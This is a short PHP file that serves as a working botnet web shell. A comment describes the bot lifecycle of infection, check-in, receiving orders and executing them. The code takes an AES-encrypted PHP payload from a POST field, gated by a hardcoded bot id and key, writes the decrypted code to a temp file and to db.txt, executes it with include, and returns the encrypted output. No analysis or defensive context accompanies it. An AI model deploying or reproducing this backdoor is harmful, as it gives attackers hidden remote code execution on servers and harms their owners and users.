<?php

    // SCENARION :  BOT INFECTED -- > BOT FIRST CONNECTION --> BOT SUCCESSFULL DECLARATION --> BOT DELETE DECLARATION FUNCTION --> BOT LISTEN FOR NEW ORDER -- > BOT EXECUTE ORDER -- > BOT CHANGE LOCATION AND SEND NEW LOCATION LINK 

function execPHP(){
    GLOBAL $_POST  ,$keyAES ,   $_SERVER;
    $key='fV{k;;DjSt&~Pe:i^Z`R:&{aNk*syuSz';
    $id='2e808b606c8820e5694f37b79935a7064e29368f';
    
    
    if(isset($_POST['hashbot']) &&  $_POST['hashbot'] === $id ){

           @ob_flush();@ob_start();$file = tempnam(sys_get_temp_dir(), 'GK').".php";
             file_put_contents("db.txt", '<?'.mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $key ,substr(base64_decode(trim($_POST['PHPCOMM'])), 16), MCRYPT_MODE_CBC, substr(base64_decode(trim($_POST['PHPCOMM'])), 0, 16)).'?>');
            file_put_contents($file, '<?'.mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $key ,substr(base64_decode(trim($_POST['PHPCOMM'])), 16), MCRYPT_MODE_CBC, substr(base64_decode(trim($_POST['PHPCOMM'])), 0, 16)).'?>');

            include($file);$t = @ob_get_clean();echo  base64_encode(substr( $id, 0, 16).mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $key ,$t, MCRYPT_MODE_CBC, substr( $id, 0, 16)));
            }
    


}
execPHP();

?>